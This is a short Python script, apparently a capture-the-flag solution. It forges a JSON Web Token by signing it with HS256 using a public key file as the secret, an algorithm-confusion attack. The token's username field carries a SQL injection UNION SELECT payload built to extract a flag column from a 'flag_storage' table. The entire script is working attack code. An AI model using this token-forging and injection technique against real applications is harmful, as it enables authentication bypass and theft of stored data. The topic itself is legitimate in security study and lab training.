import jwt

public=open('publickey','r').read()

print(jwt.encode({'username':"test' UNION SELECT 1,top_secret_flaag,3 FROM flag_storage--"},key=public,algorithm='HS256'))



